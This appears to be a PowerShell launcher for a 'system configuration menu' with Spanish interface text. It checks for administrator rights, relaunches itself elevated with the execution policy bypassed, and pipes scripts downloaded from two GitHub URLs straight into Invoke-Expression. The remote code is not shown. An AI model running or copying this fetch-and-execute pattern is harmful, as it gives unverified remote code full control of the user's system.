CLS
$host.UI.RawUI.WindowTitle = "Menú de Configuración del Sistema"
Write-Host "Cargando configuración.."
$IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if (-not $IsAdmin) {
    Write-Host "Reiniciando como administrador..."
    $urlgit = 'https://raw.githubusercontent.com/Krowne/WinInfo/refs/heads/main/m'
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $urlgit | iex`"" -Verb RunAs
    exit
}

$urlgit = 'https://raw.githubusercontent.com/Krowne/PSInfo/refs/heads/main/m'
Invoke-RestMethod $urlgit | Invoke-Expression
